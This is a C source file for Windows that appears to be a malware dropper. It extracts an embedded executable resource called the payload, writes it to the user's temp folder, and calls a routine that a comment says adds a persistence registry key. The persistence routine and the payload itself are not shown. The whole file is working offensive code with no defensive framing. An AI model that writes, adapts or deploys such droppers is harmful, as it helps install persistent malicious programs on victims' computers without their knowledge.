#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include "common.h"
#include "resource.h"

#pragma comment(lib, "Shlwapi.lib")

BOOL WritePayloadToTemp( IN LPCWSTR TempDirectory )
{
	HRSRC hResource = FindResourceA( NULL, MAKEINTRESOURCEA( IDR_EXE1 ), "EXE" );
	DWORD dwSize = SizeofResource( NULL, hResource );
	HGLOBAL hData = LoadResource( NULL, hResource );
	PVOID pPayload = NULL;
	HANDLE hFile = NULL;
	DWORD dwNumOfWritten = 0x00;

	if ( !( pPayload = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize ) ) )
	{
		LOG_ERR( "HeapAlloc" );
		return -1;
	}
	printf( "(+) Payload Located @ 0x%p\n", pPayload );

	memcpy( pPayload, hData, dwSize );

	if ( !( hFile = CreateFileW( TempDirectory, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
	                             FILE_ATTRIBUTE_NORMAL, NULL ) ) )
	{
		LOG_ERR( "CreateFileW" );
		CloseHandle( hFile );
		HeapFree( GetProcessHeap(), 0, pPayload );
		return -1;
	}

	if ( !WriteFile( hFile, pPayload, dwSize, &dwNumOfWritten, NULL ) )
	{
		LOG_ERR( "WriteFile" );
		CloseHandle( hFile );
		HeapFree( GetProcessHeap(), 0, pPayload );
		return -1;
	}
	printf( "(+) Payload Successfully Written In Temp...\n" );

	if ( hFile ) { CloseHandle( hFile ); }
	if ( pPayload != NULL ) { HeapFree( GetProcessHeap(), 0, pPayload ); }
	return TRUE;
}

int main( void )
{
	PVOID pAddress = NULL;
	ULONG Length = 0x00;
	LPCWSTR tempPath[ MAX_PATH ];

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	if ( !GetTempPathW( MAX_PATH, &tempPath ) )
	{
		LOG_ERR( "GetTempPathW" );
		return -1;
	}

	/* creating payload full path */
	StrCatW( &tempPath, PAYLOAD_NAME );

	/* writing payload to temp directory */
	if ( !WritePayloadToTemp( tempPath ) )
	{
		return -1;
	}

	/* writing the persistance registry key */
	if ( !ActivatePersistance() )
	{
		return -1;
	}

	return 0;
}
